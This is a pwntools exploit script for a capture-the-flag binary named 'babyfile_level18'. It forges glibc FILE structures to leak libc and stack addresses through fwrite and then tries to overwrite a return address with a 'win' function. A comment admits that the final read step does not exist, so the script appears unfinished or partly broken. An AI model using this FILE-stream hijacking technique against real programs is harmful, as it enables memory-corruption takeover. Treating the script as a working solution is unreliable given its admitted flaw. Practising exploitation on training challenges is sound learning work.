from pwn import * 

p = process('./babyfile_level18')

s = '''
b * fwrite
b * challenge+1684
'''





# leaking stack address
contains_libc = 0x405008
p.sendline("open_file")
p.sendline("new_note 0 8")
p.sendline("write_fp")

offset_to_write_base = 0x8 * 1
payload = p64(0x800)
payload += b"\x00" * offset_to_write_base  # Padding
payload += p64(contains_libc) # leaking stuff on the stack i.e. the rip
payload += p64(0)
payload += p64(contains_libc)
payload += p64(contains_libc+9) 
payload += b'\x00' * (0x8 * 8)
payload += p64(1) # _fileno = 1, stdout



p.sendline(payload)


p.sendline("write_file 0")



p.recvuntil("> fwrite(notes[0], 1, 8, fp);\n")
contains_stack = u64(p.recv(8)) - 0x58 # offset between return address and win
print("contains_stack @ ", hex(contains_stack))








p.sendline("write_fp")

offset_to_write_base = 0x8 * 1
payload = p64(0x800)
payload += b"\x00" * offset_to_write_base  # Padding
payload += p64(contains_stack) # leaking stuff on the stack i.e. the rip
payload += p64(0)
payload += p64(contains_stack)
payload += p64(contains_stack+9) 
payload += b'\x00' * (0x8 * 8)
payload += p64(1) # _fileno = 1, stdout



p.sendline(payload)


p.sendline("write_file 0")



p.recvuntil("> fwrite(notes[0], 1, 8, fp);\n")
rip_location = u64(p.recv(8)) - 0x130 # offset between return address and win
print("rip_location @ ", hex(rip_location))








p.sendline("write_fp")


offset_to_buf_base = 0x8 * 7
payload = b'\x00' * offset_to_buf_base
payload += p64(rip_location)
payload += p64(rip_location + 9)
payload += b'\x00' * (0x8 * 5)
payload += p64(0)
p.sendline(payload)

win = 0x4013b6

p.sendline(b"read_file 0") # oh fuck just realized there's no read_file, so leaking stack address is useless
payload2 = p64(win)
p.sendline(payload2)

gdb.attach(p, s)
time.sleep(1)
p.sendline("quit")


p.interactive()
